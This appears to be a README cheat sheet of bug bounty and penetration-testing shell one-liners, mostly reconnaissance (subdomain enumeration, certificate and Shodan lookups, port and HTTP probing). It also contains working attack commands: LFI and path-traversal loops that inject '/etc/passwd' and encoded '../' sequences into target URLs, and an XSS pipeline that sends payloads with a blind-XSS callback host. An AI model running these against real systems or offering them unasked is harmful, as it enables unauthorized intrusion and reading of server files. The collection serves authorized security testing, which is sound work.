## Pentesting One-Liners Toolkit  
A curated collection of powerful reconnaissance and vulnerability scanning one-liners for bug bounty hunters and penetration testers.  

---

##  Recon Pipeline  

```bash  
subfinder -d redacted.com -all -active | shuffledns -d redacted.com -r resolvers.txt -w n0kovo_subdomains_huge.txt | tee subs.txt | dnsx -silent -a -aaaa -cname -resp | anew resolved.txt & naabu -l resolved.txt -nmap -rate 2000 | anew ports.txt & httpx -l ports.txt -silent | anew alive.txt & katana -list alive.txt -kf all -jc | anew urls.txt & nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray | tee nuclei.txt  
Full-chain reconnaissance from subdomain discovery to vulnerability scanning.
```

## Juicy Subdomains

```bash  
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1 | grep -Ei 'api|dev|stg|test|admin|demo|stage|pre|vpn'  
Find high-value subdomains using keyword patterns.
```

## BufferOver.run Lookup

```bash  
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u  
Query BufferOver's DNS database for historical records.
```

## CertSpotter Certificates

```bash  
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u  
Extract subdomains from SSL certificates.
```

## Subdomain Takeover Check

```bash  
cat subs.txt | xargs -P50 -I% bash -c 'dig % | grep CNAME' | awk '{print $1}' | sed 's/\.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe  
Detect dangling DNS records for potential takeover.
```

## LFI Scanning

```bash  
cat targets.txt | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P25 sh -c 'curl -s "%" | grep -q "root:x" && echo "[+] VULN: %"'  
Automated LFI payload testing with parallel requests.
```

## Path Traversal Bypass

```bash  
cat targets.txt | while read host; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host VULNERABLE"; done  
Test for LFI bypasses using directory traversal.
```

## XSS Hunting

```bash  
subfinder -dL domainlist.txt | dnsx | shuf | gau | anew | egrep -iv "\.(jpg|jpeg|gif|tif|tiff|png|ttf|woff|woff2|php|ico|pdf|svg|txt|js)$" | urless | dalfox pipe -b https://xss.hunter/?q=1  
Full-chain XSS discovery pipeline with active probing.
```

## Shodan CLI

```bash  
shodan search ssl.cert.subject.cn:"target.com" --fields ip_str | anew ips.txt  
Find IPs associated with target's SSL certificates.
```

## Tools Used
Tool	Purpose	GitHub
-- Subfinder	Subdomain discovery	https://github.com/projectdiscovery/subfinder
-- ShuffleDNS	Mass DNS resolver	https://github.com/projectdiscovery/shuffledns
-- dnsx	DNS toolkit	https://github.com/projectdiscovery/dnsx
-- Naabu	Port scanner	https://github.com/projectdiscovery/naabu
-- HTTPX	HTTP probing	https://github.com/projectdiscovery/httpx
-- Katana	Crawler	https://github.com/projectdiscovery/katana
-- Nuclei	Vulnerability scanning	https://github.com/projectdiscovery/nuclei
-- Gau	URL collector	https://github.com/lc/gau
-- Dalfox	XSS scanner	https://github.com/hahwul/dalfox
-- Shodan CLI	Internet intelligence	https://cli.shodan.io/

## Credit

 -- https://x.com/TheMsterDoctor1/status/1905471835128373665
 -- https://github.com/ifconfig-me/cool-bugbounty-oneliners?tab=readme-ov-file
